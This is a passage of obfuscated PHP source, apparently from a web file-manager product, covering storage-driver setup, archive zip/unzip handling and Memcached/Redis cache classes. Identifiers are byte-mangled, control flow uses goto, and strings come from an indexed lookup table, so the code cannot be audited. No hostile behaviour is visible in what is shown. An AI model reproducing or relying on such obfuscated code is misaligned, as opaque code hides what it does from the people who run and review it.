(!$C‚”¦ç›[$B´‡ÒÈ•››[397]]) { $B¹»íŒÕÙİ = Model($B´‡ÒÈ•››[589])->getInfo($C‚”¦ç›[$B´‡ÒÈ•››[482]]); $fÚÁ¬³’áŸ = KodIO::clear($B¹»íŒÕÙİ[$B´‡ÒÈ•››[1104]] . $B„™í¡‹õ[$B´‡ÒÈ•››[1097]]); $B„™í¡‹õ[$B´‡ÒÈ•››[480]] = $B¹»íŒÕÙİ; $B„™í¡‹õ[$B´‡ÒÈ•››[1081]] = $fÚÁ¬³’áŸ; $cßÂğáĞœø = array($B´‡ÒÈ•››[1099] => $B´‡ÒÈ•››[1105], $B´‡ÒÈ•››[6] => $B„™í¡‹õ); } break; case KodIO::KOD_SHARE_ITEM: $cßÂğáĞœø = array($B´‡ÒÈ•››[1099] => $B´‡ÒÈ•››[1106], $B´‡ÒÈ•››[6] => $B„™í¡‹õ); $B¹»íŒÕÙİ = Model($B´‡ÒÈ•››[589])->getInfo($B„™í¡‹õ[$B´‡ÒÈ•››[395]]); if ($B¹»íŒÕÙİ[$B´‡ÒÈ•››[397]] == $B´‡ÒÈ•››[191]) { $fÚÁ¬³’áŸ = KodIO::clear($B¹»íŒÕÙİ[$B´‡ÒÈ•››[1104]] . $B„™í¡‹õ[$B´‡ÒÈ•››[1097]]); $B„™í¡‹õ[$B´‡ÒÈ•››[480]] = $B¹»íŒÕÙİ; $B„™í¡‹õ[$B´‡ÒÈ•››[1081]] = $fÚÁ¬³’áŸ; $cßÂğáĞœø = array($B´‡ÒÈ•››[1099] => $B´‡ÒÈ•››[1107], $B´‡ÒÈ•››[6] => $B„™í¡‹õ); } else { if (!$fÚÁ¬³’áŸ) { $fÚÁ¬³’áŸ = $B¹»íŒÕÙİ[$B´‡ÒÈ•››[397]]; } } break; default: $fÚÁ¬³’áŸ = $B„™í¡‹õ[$B´‡ÒÈ•››[76]]; $cßÂğáĞœø = array($B´‡ÒÈ•››[1099] => $B´‡ÒÈ•››[1108]); break; } $cÊ«ÏŞä£ø = $B„™í¡‹õ[$B´‡ÒÈ•››[76]]; if (!isset(self::$driverCache[$cÊ«ÏŞä£ø])) { $A†¿êùö† = strtolower($cßÂğáĞœø[$B´‡ÒÈ•››[94]]); $a–ˆ÷Ÿá«Å = $GLOBALS[$B´‡ÒÈ•››[6]][$B´‡ÒÈ•››[88]][$B´‡ÒÈ•››[828]]; $C¹À–”¼ = $B´‡ÒÈ•››[72] . (isset($a–ˆ÷Ÿá«Å[$A†¿êùö†]) ? $a–ˆ÷Ÿá«Å[$A†¿êùö†] : ucfirst($A†¿êùö†)); if (!class_exists($C¹À–”¼)) { show_json("{$C¹À–”¼}\40\156\157\x74\x20\145\170\151\x73\164\163\41", !1); } $e£´¨ÔáÜ = isset($cßÂğáĞœø[$B´‡ÒÈ•››[6]]) ? $cßÂğáĞœø[$B´‡ÒÈ•››[6]] : !1; self::$driverCache[$cÊ«ÏŞä£ø] = new $C¹À–”¼($e£´¨ÔáÜ); } goto E‹éË¢õ—Ô; bÍİ™î‚‹Í: $d ¯ÈÉ§Œˆ->path = $fÚÁ¬³’áŸ; return $d ¯ÈÉ§Œˆ; goto f¼ƒ¡Ñ¬êë; eêøÍ¢‡ï: if (isset($cßÂğáĞœø[$B´‡ÒÈ•››[6]][$B´‡ÒÈ•››[1109]])) { $d ¯ÈÉ§Œˆ->pathBase = rtrim($cßÂğáĞœø[$B´‡ÒÈ•››[6]][$B´‡ÒÈ•››[1109]], $B´‡ÒÈ•››[8]) . $B´‡ÒÈ•››[8]; $fÚÁ¬³’áŸ = $d ¯ÈÉ§Œˆ->pathBase . ltrim($fÚÁ¬³’áŸ, $B´‡ÒÈ•››[8]); } $fÚÁ¬³’áŸ = $d ¯ÈÉ§Œˆ->getPath($fÚÁ¬³’áŸ); if (isset($B„™í¡‹õ[$B´‡ÒÈ•››[1081]])) { $fÚÁ¬³’áŸ = $B„™í¡‹õ[$B´‡ÒÈ•››[1081]]; } goto bÍİ™î‚‹Í; E‹éË¢õ—Ô: $d ¯ÈÉ§Œˆ = self::$driverCache[$cÊ«ÏŞä£ø]; $d ¯ÈÉ§Œˆ->pathDriver = $AÔôîä‹Ô©; $d ¯ÈÉ§Œˆ->pathBase = $B´‡ÒÈ•››[33]; goto eêøÍ¢‡ï; F˜¿¯’ÇÏ: $B´‡ÒÈ•›› =& $_SERVER[›é¼±]; $AÔôîä‹Ô© = $B„™í¡‹õ[$B´‡ÒÈ•››[1098]]; $aÄˆ·ŞàÙÄ = $B„™í¡‹õ[$B´‡ÒÈ•››[395]]; goto dÜĞÕ‹”Ù; f¼ƒ¡Ñ¬êë: } public static function errorTips($f’Ë®ß•×² = false) { goto c¯°Ò¸¢Ú; C³ÙÖŒïßÜ: if ($f’Ë®ß•×² === -1) { return $CÛ…¬‚Ãƒ¢ ? $CÛ…¬‚Ãƒ¢[count($CÛ…¬‚Ãƒ¢) - 1] : $F±Ò¶±ñø“[33]; } if ($f’Ë®ß•×² === !1) { return implode($F±Ò¶±ñø“[229], $CÛ…¬‚Ãƒ¢); } if (count($CÛ…¬‚Ãƒ¢) >= $c²ô¾œó–é) { $CÛ…¬‚Ãƒ¢ = array_slice($CÛ…¬‚Ãƒ¢, $c²ô¾œó–é * 0.5, $c²ô¾œó–é); } goto aãá’¹ÓÚŠ; aãá’¹ÓÚŠ: $CÛ…¬‚Ãƒ¢[] = $f’Ë®ß•×²; write_log($F±Ò¶±ñø“[160] . ACTION . $F±Ò¶±ñø“[1110] . $f’Ë®ß•×², $F±Ò¶±ñø“[1111]); goto AïäŒì¿ß; c¯°Ò¸¢Ú: $F±Ò¶±ñø“ =& $_SERVER[›é¼±]; static $CÛ…¬‚Ãƒ¢ = array(); $c²ô¾œó–é = 1000; goto C³ÙÖŒïßÜ; AïäŒì¿ß: } public static function getLastError($C²¹º¤—î = '') { $cø»ùŒ×ÍÌ = self::errorTips(-1); return $cø»ùŒ×ÍÌ ? $cø»ùŒ×ÍÌ : $C²¹º¤—î; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bÍ™¢ÀçİÎ; if (!$bÍ™¢ÀçİÎ) { $E„ÅŠãğ÷¥ = IO::init($_SERVER[›é¼±][8]); } return $E„ÅŠãğ÷¥; } private static function iconvSystem($C³éÎ¹¨Ì¥) { return self::local()->iconvSystem($C³éÎ¹¨Ì¥); } private static function iconvApp($CÅÇ¬ØŒ½×) { return self::local()->iconvApp($CÅÇ¬ØŒ½×); } public static function zip($e­İÍØ¸²ß, $AÑ©±íøö© = "\x7a\x69\x70", $f„”Ñ§öó¬ = '', $f™ù©‘ä¼Î = REPEAT_RENAME) { goto b‰–‹ß¿; Fš†ëø™»¨: if ($f„”Ñ§öó¬ || !$aôîÏ¹æÂÕ) { if ($aôîÏ¹æÂÕ && strstr($aôîÏ¹æÂÕ, TEMP_FILES)) { $B§ñ¤‚×ÎŠ = $F©“öõÈ‡Ğ = array(); recursion_dir($Aù‹»³É¤, $B§ñ¤‚×ÎŠ, $F©“öõÈ‡Ğ, 0); foreach ($B§ñ¤‚×ÎŠ as $B§®¾Œ‰·) { del_dir($B§®¾Œ‰·); } foreach ($F©“öõÈ‡Ğ as $aëî¿Æ˜Š) { if ($aëî¿Æ˜Š == $c‡ğõ‰¡Ñ) { continue; } del_file($aëî¿Æ˜Š); } } return $d‘¾Š©¸Øğ; } $a…‹ÙØºâ = self::pathFather($F…î±ã–ù[$bšØ¯·[76]]); $eÉŒìë®ã‰ = self::move($d‘¾Š©¸Øğ, $a…‹ÙØºâ, $f™ù©‘ä¼Î); goto DóŠ„å»íí; a«ÒĞÏ¡·: foreach ($F©“öõÈ‡Ğ as $C™Ğ‚ß˜Ïæ => $BÖÓ †åİÉ) { $F©“öõÈ‡Ğ[$C™Ğ‚ß˜Ïæ] = self::iconvSystem($BÖÓ †åİÉ); } KodArchive::create($c‡ğõ‰¡Ñ, $F©“öõÈ‡Ğ); if (!IO::exist($d‘¾Š©¸Øğ)) { if ($aôîÏ¹æÂÕ) { del_dir($aôîÏ¹æÂÕ); } show_json(LNG($bšØ¯·[1114]), !1); } goto Fš†ëø™»¨; b‰–‹ß¿: $bšØ¯· =& $_SERVER[›é¼±]; $c‰ŒäÍ³¢ø = self::init($e­İÍØ¸²ß[0][$bšØ¯·[76]]); $F…î±ã–ù = self::info($e­İÍØ¸²ß[0][$bšØ¯·[76]]); goto Cˆ¤Ÿ¬ÛØò; DóŠ„å»íí: if (!$eÉŒìë®ã‰) { del_dir($aôîÏ¹æÂÕ); show_json(LNG($bšØ¯·[1114]), !1); } del_dir($aôîÏ¹æÂÕ); return $eÉŒìë®ã‰; goto Eºº¾¹Àí; FóÒŠç˜š¾: if (count($F©“öõÈ‡Ğ) > 1) { $F½öŠ÷Ô¨ï = IO::info(IO::pathFather($F…î±ã–ù[$bšØ¯·[76]])); $FçÅßÙáŠ¬ = $F½öŠ÷Ô¨ï[$bšØ¯·[28]]; } $Aù‹»³É¤ = $aôîÏ¹æÂÕ; if (!$Aù‹»³É¤) { $Aù‹»³É¤ = get_path_father($F…î±ã–ù[$bšØ¯·[76]]); if (!$f„”Ñ§öó¬ && $c‰ŒäÍ³¢ø->getType() == $bšØ¯·[106]) { $Aù‹»³É¤ = get_path_father($c‰ŒäÍ³¢ø->path); } $Aâ•Å¨—±Ö = IO::info($Aù‹»³É¤); if (!$Aâ•Å¨—±Ö[$bšØ¯·[196]]) { show_json(LNG($bšØ¯·[1113]), !1); } } goto B¿‘¡ğ¨Õ; B¿‘¡ğ¨Õ: $d‘¾Š©¸Øğ = $Aù‹»³É¤ . $FçÅßÙáŠ¬ . $bšØ¯·[95] . $AÑ©±íøö©; $d‘¾Š©¸Øğ = get_filename_auto($d‘¾Š©¸Øğ, $bšØ¯·[33], $f™ù©‘ä¼Î); $c‡ğõ‰¡Ñ = self::iconvSystem($d‘¾Š©¸Øğ); goto a«ÒĞÏ¡·; Cˆ¤Ÿ¬ÛØò: $aôîÏ¹æÂÕ = !1; if (!$f„”Ñ§öó¬ && $c‰ŒäÍ³¢ø->getType() == $bšØ¯·[106]) { $F©“öõÈ‡Ğ = self::zipFileList($e­İÍØ¸²ß); } else { $aôîÏ¹æÂÕ = $f„”Ñ§öó¬ ? $f„”Ñ§öó¬ : TEMP_FILES . $bšØ¯·[1112] . time() . rand_string(8) . $bšØ¯·[8]; mk_dir($aôîÏ¹æÂÕ); $F©“öõÈ‡Ğ = self::zipFileList($e­İÍØ¸²ß, $aôîÏ¹æÂÕ); } $FçÅßÙáŠ¬ = $F…î±ã–ù[$bšØ¯·[28]]; goto FóÒŠç˜š¾; Eºº¾¹Àí: } public static function unzip($DÇœÜ·™ŒÜ, $dÈŸ¶ŞãÔÉ = "\162\145\160\x6c\x61\x63\145") { goto Cù×‚óŞ¨; DÉ‹·‰ç¨: $d¶Õ¤¼Ã¡ = self::tmpFileName($f÷³­½†å¹); $BÚÀÑÔ¹¾Ó = TEMP_FILES . $d¶Õ¤¼Ã¡; del_dir($BÚÀÑÔ¹¾Ó); goto eºÑÌ¥İãã; eºÑÌ¥İãã: mk_dir($BÚÀÑÔ¹¾Ó); $B¼–·¿‚Ö = self::fileExt($f÷³­½†å¹); $E““ˆ­ŞŞ = $BÚÀÑÔ¹¾Ó . $D«ø¢»ĞÀ[95] . $B¼–·¿‚Ö; goto BƒÑ£†×; BƒÑ£†×: if (!@file_exists(self::iconvSystem($E““ˆ­ŞŞ))) { $Eõ÷ò›ËôŞ = self::localFilePath($c«È‰»Ö¶„, $B¼–·¿‚Ö); $E““ˆ­ŞŞ = $Eõ÷ò›ËôŞ ? $Eõ÷ò›ËôŞ : parent::download($c«È‰»Ö¶„, $E““ˆ­ŞŞ); } $E““ˆ­ŞŞ = self::iconvSystem($E““ˆ­ŞŞ); $Eª°Š¦»´õ = isset($DÇœÜ·™ŒÜ[$D«ø¢»ĞÀ[1117]]) ? $DÇœÜ·™ŒÜ[$D«ø¢»ĞÀ[1117]] : $D«ø¢»ĞÀ[1118]; goto b†šŠ•¬ôß; b†šŠ•¬ôß: $F½ãö´Şïª = KodArchive::extract($E““ˆ­ŞŞ, $BÚÀÑÔ¹¾Ó . $D«ø¢»ĞÀ[8], $Eª°Š¦»´õ); self::archiveExt(); if (!$F½ãö´Şïª[$D«ø¢»ĞÀ[1119]]) { show_json($D«ø¢»ĞÀ[1120] . $F½ãö´Şïª[$D«ø¢»ĞÀ[1121]], !1); } goto b³ÈÉÉ¿òª; bÅÀ–Û‹: return !0; goto a‡Š«¢…­ò; FíÃ½Ó: foreach ($a‚ƒô¦Èç§ as $B“¼Š †¨Ü) { $B“¼Š †¨Ü = self::iconvApp($B“¼Š †¨Ü); self::move($B“¼Š †¨Ü, $bï’Ã¿‚Ñ‘, $dÈŸ¶ŞãÔÉ); } del_dir($BÚÀÑÔ¹¾Ó); if (!$Eõ÷ò›ËôŞ) { del_file($E““ˆ­ŞŞ); } goto bÅÀ–Û‹; Cù×‚óŞ¨: $D«ø¢»ĞÀ =& $_SERVER[›é¼±]; $c«È‰»Ö¶„ = $DÇœÜ·™ŒÜ[$D«ø¢»ĞÀ[76]]; $bï’Ã¿‚Ñ‘ = $DÇœÜ·™ŒÜ[$D«ø¢»ĞÀ[1115]]; goto dèìî”çÂÉ; b³ÈÉÉ¿òª: Hook::trigger($D«ø¢»ĞÀ[1122], $BÚÀÑÔ¹¾Ó); recursion_dir($BÚÀÑÔ¹¾Ó, $C™ãÔ¾ìƒ–, $cˆ¥Ú¯ØÕ¨, 0); $a‚ƒô¦Èç§ = array_merge($C™ãÔ¾ìƒ–, $cˆ¥Ú¯ØÕ¨); goto FíÃ½Ó; dèìî”çÂÉ: if (!($f÷³­½†å¹ = parent::info($c«È‰»Ö¶„))) { show_json(LNG($D«ø¢»ĞÀ[1116]), !1); } if (!($d•Éæ›˜Æè = parent::infoFull($bï’Ã¿‚Ñ‘))) { $bï’Ã¿‚Ñ‘ = parent::mkdir($bï’Ã¿‚Ñ‘); $d•Éæ›˜Æè = array($D«ø¢»ĞÀ[76] => $bï’Ã¿‚Ñ‘); } else { if (isset($d•Éæ›˜Æè[$D«ø¢»ĞÀ[397]]) && trim($d•Éæ›˜Æè[$D«ø¢»ĞÀ[76]], $D«ø¢»ĞÀ[8]) != trim($bï’Ã¿‚Ñ‘, $D«ø¢»ĞÀ[8])) { $EŒßç®Œöé = KodIO::make($d•Éæ›˜Æè[$D«ø¢»ĞÀ[492]]); $AÉ¿ìÛÍ = parent::fileNameAuto($EŒßç®Œöé, $d•Éæ›˜Æè[$D«ø¢»ĞÀ[28]], REPEAT_RENAME_FOLDER, !0); $bï’Ã¿‚Ñ‘ = parent::mkdir($EŒßç®Œöé . $AÉ¿ìÛÍ); $d•Éæ›˜Æè = array($D«ø¢»ĞÀ[76] => $bï’Ã¿‚Ñ‘); } } $bï’Ã¿‚Ñ‘ = $d•Éæ›˜Æè[$D«ø¢»ĞÀ[76]]; goto DÉ‹·‰ç¨; a‡Š«¢…­ò: } public static function unzipList($d»ô‚Ç°¸) { goto eñÄÆ‡‡ŒÁ; bñ ø…ô: if (isset($cñàŒÜØ’”)) { $A©Ùˆ‚›Ê = array($cñàŒÜØ’”[$c„³åÜ‹á[76]], $cñàŒÜØ’”[$c„³åÜ‹á[1123]], $cñàŒÜØ’”[$c„³åÜ‹á[28]]); $F¶Äµ‰ãé = md5(implode($c„³åÜ‹á[71], $A©Ùˆ‚›Ê)) . $c„³åÜ‹á[95] . get_path_ext($cñàŒÜØ’”[$c„³åÜ‹á[28]]); } else { $A©Ùˆ‚›Ê = array($fÑ…½¦‚÷[$c„³åÜ‹á[28]], $fÑ…½¦‚÷[$c„³åÜ‹á[76]], $fÑ…½¦‚÷[$c„³åÜ‹á[78]]); $F¶Äµ‰ãé = md5(implode($c„³åÜ‹á[71], $A©Ùˆ‚›Ê)) . $c„³åÜ‹á[95] . $c¾ñä‘Šâ; } if ($fØ¦æ²¯ñ‘ == -1) { $AõÛê¡Ÿ¶ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\x77\57{$EÖ˜Ê£É•}\x2f{$F¶Äµ‰ãé}\56\154\x6f\147"; $e®˜Ú«¿à = self::infoFull($AõÛê¡Ÿ¶); if ($e®˜Ú«¿à) { $AõÛê¡Ÿ¶ = $e®˜Ú«¿à[$c„³åÜ‹á[76]]; $FêÀç§“®š = self::getContent($AõÛê¡Ÿ¶); if ($FêÀç§“®š) { $a›ºãëŞ„¸ = json_decode($FêÀç§“®š, !0); if (count($a›ºãëŞ„¸) >= $DáñÆë”‡) { show_json(sprintf(LNG($c„³åÜ‹á[1125]), count($a›ºãëŞ„¸)), !1); } return $a›ºãëŞ„¸; } } else { $AõÛê¡Ÿ¶ = self::mkfile($AõÛê¡Ÿ¶); } } $eõ ®ÚÚà• = TEMP_FILES . $EÖ˜Ê£É•; goto AÂ‰‡’Èéñ; Fç„ùóƒËº: $DáñÆë”‡ = 50000; if (request_url_safe($E§«½ä©§Ş)) { $cñàŒÜØ’” = parse_url_query($E§«½ä©§Ş); if (!isset($cñàŒÜØ’”[$c„³åÜ‹á[76]])) { show_json($c„³åÜ‹á[1124], !1); } } $Dé÷Ëˆø§Ì = isset($cñàŒÜØ’”) ? $cñàŒÜØ’”[$c„³åÜ‹á[76]] : $E§«½ä©§Ş; goto b¦áº‡Œ”; c×ÔÌ½ÒÃä: $a›ºãëŞ„¸ = json_encode($aÎ›² ÀŞ»[$c„³åÜ‹á[1121]]); self::setContent($AõÛê¡Ÿ¶, $a›ºãëŞ„¸); if (count($aÎ›² ÀŞ»[$c„³åÜ‹á[1121]]) >= $DáñÆë”‡) { show_json(sprintf(LNG($c„³åÜ‹á[1125]), count($aÎ›² ÀŞ»[$c„³åÜ‹á[1121]])), !1); } goto AùŸğ¾Àä™; AÂ‰‡’Èéñ: if (!is_dir($eõ ®ÚÚà•)) { mk_dir($eõ ®ÚÚà•); } $c×·²½÷‘£ = $eõ ®ÚÚà• . $c„³åÜ‹á[8] . $F¶Äµ‰ãé; if (!@file_exists(self::iconvSystem($c×·²½÷‘£))) { if (isset($cñàŒÜØ’”)) { url_request($E§«½ä©§Ş, $c„³åÜ‹á[1126], $c×·²½÷‘£); } else { $c¿µáß‚óÅ = self::localFilePath($E§«½ä©§Ş, $c¾ñä‘Šâ); $c×·²½÷‘£ = $c¿µáß‚óÅ ? $c¿µáß‚óÅ : self::download($E§«½ä©§Ş, $c×·²½÷‘£); } } goto EŠ‚‚Äò¡š; EŠ‚‚Äò¡š: $c×·²½÷‘£ = self::iconvSystem($c×·²½÷‘£); if ($fØ¦æ²¯ñ‘ >= 0) { $cô–òì Ò = isset($d»ô‚Ç°¸[$c„³åÜ‹á[1127]]) ? $d»ô‚Ç°¸[$c„³åÜ‹á[1127]] : !1; $BÓ® Ÿ„Óù = isset($d»ô‚Ç°¸[$c„³åÜ‹á[28]]) ? $d»ô‚Ç°¸[$c„³åÜ‹á[28]] : $c„³åÜ‹á[33]; KodArchive::filePreview($c×·²½÷‘£, $fØ¦æ²¯ñ‘, $cô–òì Ò, $BÓ® Ÿ„Óù); self::archiveExt(); die; } $aÎ›² ÀŞ» = KodArchive::listContent($c×·²½÷‘£); goto eëŞÇØ­Œˆ; b¦áº‡Œ”: $fÑ…½¦‚÷ = self::info($Dé÷Ëˆø§Ì); $c¾ñä‘Šâ = self::fileExt($fÑ…½¦‚÷); $EÖ˜Ê£É• = self::tmpFileName($fÑ…½¦‚÷); goto bñ ø…ô; eñÄÆ‡‡ŒÁ: $c„³åÜ‹á =& $_SERVER[›é¼±]; $E§«½ä©§Ş = $d»ô‚Ç°¸[$c„³åÜ‹á[76]]; $fØ¦æ²¯ñ‘ = isset($d»ô‚Ç°¸[$c„³åÜ‹á[1123]]) ? $d»ô‚Ç°¸[$c„³åÜ‹á[1123]] : -1; goto Fç„ùóƒËº; eëŞÇØ­Œˆ: self::archiveExt(); del_dir($eõ ®ÚÚà•); if (!$aÎ›² ÀŞ»[$c„³åÜ‹á[1119]]) { show_json($aÎ›² ÀŞ»[$c„³åÜ‹á[1121]], !1); } goto c×ÔÌ½ÒÃä; AùŸğ¾Àä™: return $aÎ›² ÀŞ»[$c„³åÜ‹á[1121]]; goto Côá½ìê™Œ; Côá½ìê™Œ: } private static function fileExt($A¹´âÌ¹“Œ) { $eí’È–ğß‹ =& $_SERVER[›é¼±]; $f¶ÔÅÌ­ê = $A¹´âÌ¹“Œ[$eí’È–ğß‹[168]]; if ($f¶ÔÅÌ­ê == $eí’È–ğß‹[1128]) { $D¹ãø…ØÂÕ = $eí’È–ğß‹[1129]; if (substr($A¹´âÌ¹“Œ[$eí’È–ğß‹[28]], -strlen($D¹ãø…ØÂÕ)) == $D¹ãø…ØÂÕ) { $f¶ÔÅÌ­ê = $eí’È–ğß‹[1130]; } } self::archiveExt($f¶ÔÅÌ­ê); return $f¶ÔÅÌ­ê; } private static function zipFileList($a¡Ã—³—Å, $c’Ã³ã³áÏ = false) { $cˆ­‚š‘› =& $_SERVER[›é¼±]; $DŠá½¥Ü•° = array(); foreach ($a¡Ã—³—Å as $Bàœ¼Ÿ¾Õ) { $E‘˜âÈ‚òä = $Bàœ¼Ÿ¾Õ[$cˆ­‚š‘›[76]]; if ($c’Ã³ã³áÏ) { $E‘˜âÈ‚òä = self::copy($Bàœ¼Ÿ¾Õ[$cˆ­‚š‘›[76]], $c’Ã³ã³áÏ, $cˆ­‚š‘›[820]); } else { $f¿¦î‘‹ò¥ = self::init($Bàœ¼Ÿ¾Õ[$cˆ­‚š‘›[76]]); if ($f¿¦î‘‹ò¥->getType() == $cˆ­‚š‘›[106]) { $E‘˜âÈ‚òä = $f¿¦î‘‹ò¥->path; } } if ($E‘˜âÈ‚òä && self::local()->exist($E‘˜âÈ‚òä)) { $DŠá½¥Ü•°[$Bàœ¼Ÿ¾Õ[$cˆ­‚š‘›[76]]] = $E‘˜âÈ‚òä; } } if (!empty($DŠá½¥Ü•°)) { return array_values($DŠá½¥Ü•°); } show_json(LNG($cˆ­‚š‘›[1094]), !1); } public static function tmpFileName($A¸ÓœÛæ‘¹) { $eª¾”¡¦· =& $_SERVER[›é¼±]; $fªºƒ·­ñ = array($A¸ÓœÛæ‘¹[$eª¾”¡¦·[28]], $A¸ÓœÛæ‘¹[$eª¾”¡¦·[76]], $A¸ÓœÛæ‘¹[$eª¾”¡¦·[78]], $A¸ÓœÛæ‘¹[$eª¾”¡¦·[515]]); return md5(implode($eª¾”¡¦·[71], $fªºƒ·­ñ)); } private static function localFilePath($AˆµÔ…Áâš, $e½‰À»›î²) { goto aáÁ½ƒ…¿¼; fêŠÂ‚«¥Ÿ: if ($BÊ¸»îÙ–Í == $D÷†‹Æ¶§ğ[106] || $BÊ¸»îÙ–Í == $D÷†‹Æ¶§ğ[1134]) { if (!$CÔŒµï…->exist($CÔŒµï…->path)) { show_json(LNG($D÷†‹Æ¶§ğ[105]), !1); } return $CÔŒµï…->path; } return !1; goto f£©ôëç»½; aáÁ½ƒ…¿¼: $D÷†‹Æ¶§ğ =& $_SERVER[›é¼±]; if ($e½‰À»›î² == $D÷†‹Æ¶§ğ[1131] && strtoupper(substr(PHP_OS, 0, 3)) == $D÷†‹Æ¶§ğ[1132]) { return !1; } $Cõ‹»Ö²“ = KodIO::parse($AˆµÔ…Áâš); goto D·ê®Ñ¬Ïˆ; D·ê®Ñ¬Ïˆ: if ($Cõ‹»Ö²“[$D÷†‹Æ¶§ğ[29]] == KodIO::KOD_SOURCE) { $B¿«Ÿ¤× = Model($D÷†‹Æ¶§ğ[827])->fileInfoGet(KodIO::sourceID($AˆµÔ…Áâš)); if (!$B¿«Ÿ¤×[$D÷†‹Æ¶§ğ[76]]) { show_json($D÷†‹Æ¶§ğ[1133], !1); } $AˆµÔ…Áâš = $B¿«Ÿ¤×[$D÷†‹Æ¶§ğ[76]]; } $CÔŒµï… = self::init($AˆµÔ…Áâš); $BÊ¸»îÙ–Í = $CÔŒµï…->getType(); goto fêŠÂ‚«¥Ÿ; f£©ôëç»½: } private static function archiveExt($eÇŒÍãó«´ = '') { $GLOBALS[$_SERVER[›é¼±][1135]] = $eÇŒÍãó«´; } } goto A÷¡êÚĞôË; AîÏøõ ¼: class CacheMemcached { public $handle; public $cacheTime; public function __construct($eœ¤„íÏóŒ, $AÍÛæå®ˆ) { $E‚™˜Ã§ƒõ =& $_SERVER[›é¼±]; if (!class_exists($E‚™˜Ã§ƒõ[866])) { show_json($E‚™˜Ã§ƒõ[867], !1); } $this->cacheTime = $AÍÛæå®ˆ; $this->handle = new Memcached(); if (is_array($eœ¤„íÏóŒ[$E‚™˜Ã§ƒõ[868]]) && count($eœ¤„íÏóŒ[$E‚™˜Ã§ƒõ[868]]) >= 1) { foreach ($eœ¤„íÏóŒ[$E‚™˜Ã§ƒõ[868]] as $eìÜŞÕ›ù) { $EŒ‡Ÿ‰ç å = explode($E‚™˜Ã§ƒõ[4], $eìÜŞÕ›ù); $this->handle->addServer($EŒ‡Ÿ‰ç å[0], $EŒ‡Ÿ‰ç å[1]); } } else { $this->handle->addServer($eœ¤„íÏóŒ[$E‚™˜Ã§ƒõ[175]], $eœ¤„íÏóŒ[$E‚™˜Ã§ƒõ[176]]); } } public function set($a¤åÓáÅ„„, $AÊÒÍ†…¨•, $AáÚ¡¨Û¤‰ = false) { $AáÚ¡¨Û¤‰ = $AáÚ¡¨Û¤‰ ? $AáÚ¡¨Û¤‰ : $this->cacheTime; return $this->handle->set($a¤åÓáÅ„„, $AÊÒÍ†…¨•, $AáÚ¡¨Û¤‰); } public function get($A¿‰íËªƒì) { return $this->handle->get($A¿‰íËªƒì); } public function remove($BÔ‚ Æ¤±ì) { return $this->handle->delete($BÔ‚ Æ¤±ì); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($B’åà†ñ¯, $AÈ„ÂÎ¶Ç¡) { $f§¥êËÒÈò =& $_SERVER[›é¼±]; if (!class_exists($f§¥êËÒÈò[869])) { show_json($f§¥êËÒÈò[870], !1); } $this->cacheTime = $AÈ„ÂÎ¶Ç¡; $FõŸ‡÷ß¶» = isset($B’åà†ñ¯[$f§¥êËÒÈò[871]]) ? $B’åà†ñ¯[$f§¥êËÒÈò[871]] : 10; $d‚ï’¢í…ù = _get($B’åà†ñ¯, $f§¥êËÒÈò[868]); if ($d‚ï’¢í…ù && is_array($d‚ï’¢í…ù)) { $this->initCluster($B’åà†ñ¯, $FõŸ‡÷ß¶»); } else { $this->handle = $this->init($B’åà†ñ¯, $FõŸ‡÷ß¶»); } } private function init($aÙˆøÔÁÚ, $aÍ»Â·¼¼Ü) { $fŞ—ˆ¹å² =& $_SERVER[›é¼±]; $dÒ–Ê³œ½õ = new Redis(); $eàŒƒ©’ñŒ = isset($aÙˆøÔÁÚ[$fŞ—ˆ¹å²[872]]) ? $aÙˆøÔÁÚ[$fŞ—ˆ¹å²[872]] : !1; if ($eàŒƒ©’ñŒ) { $dÒ–Ê³œ½õ->pconnect($aÙˆøÔÁÚ[$fŞ—ˆ¹å²[175]], $aÙˆøÔÁÚ[$fŞ—ˆ¹å²[176]], $aÍ»Â·¼¼Ü); } else { $dÒ–Ê³œ½õ->connect($aÙˆøÔÁÚ[$fŞ—ˆ¹å²[175]], $aÙˆøÔÁÚ[$fŞ—ˆ¹å²[176]], $aÍ»Â·¼¼Ü); } if (!empty($aÙˆøÔÁÚ[$fŞ—ˆ¹å²[408]])) { $dÒ–Ê³œ½õ->auth($aÙˆøÔÁÚ[$fŞ—ˆ¹å²[408]]); } return $dÒ–Ê³œ½õ; } private function initCluster($a¤óÃ«‡“», $F‡­¤£Å³Í) { $fï´‚”¥ºĞ =& $_SERVER[›é¼±]; $EÉôšŒÊòè = array($fï´‚”¥ºĞ[873], $fï´‚”¥ºĞ[874], $fï´‚”¥ºĞ[875]); $D¥©íÂñ½ù = $fï´‚”¥ºĞ[873]; if (isset($a¤óÃ«‡“»[$fï´‚”¥ºĞ[12]]) && in_array($a¤óÃ«‡“»[$fï´‚”¥ºĞ[12]], $EÉôšŒÊòè)) { $D¥©íÂñ½ù = $a¤óÃ«‡“»[$fï´‚”¥ºĞ[12]]; } switch ($D¥©íÂñ½ù) { case $fï´‚”¥ºĞ[873]: $this->_slave($a¤óÃ«‡“», $F‡­¤£Å³Í); break; case $fï´‚”¥ºĞ[874]: break; case $fï´‚”¥ºĞ[875]: $this->isCluster = !0; $càğéš÷Ø = $a¤óÃ«‡“»[$fï´‚”¥ºĞ[868]]; $bÅ¤éá•ô– = isset($a¤óÃ«‡“»[$fï´‚”¥ºĞ[872]]) ? $a¤óÃ«‡“»[$fï´‚”¥ºĞ[872]] : !1; $Bí°Êªè…÷ = isset($a¤óÃ«‡“»[$fï´‚”¥ºĞ[408]]) ? $a¤óÃ«‡“»[$fï´‚”¥ºĞ[408]] : null; $this->handle = new RedisCluster(NUll, $càğéš÷Ø, $F‡­¤£Å³Í, $F‡­¤£Å³Í, $bÅ¤éá•ô–, $Bí°Êªè…÷); break; default: break; } } private function _slave($FŸËâ®Ê²ß, $dçåğğùŞ) { goto BÃ™öªñõ; d±°­µ½µ¸: unset($E£½ÍÄ•¸Ë[0]); if (empty($E£½ÍÄ•¸Ë)) { return; } $DˆÌæÈÌ„ = array_rand($E£½ÍÄ•¸Ë); goto aÈï‘Ì; BÃ™öªñõ: $E£½ÍÄ•¸Ë = $FŸËâ®Ê²ß[$_SERVER[›é¼±][868]]; $this->filterConfig($FŸËâ®Ê²ß, $E£½ÍÄ•¸Ë[0]); $this->handle = $this->init($FŸËâ®Ê²ß, $dçåğğùŞ); goto 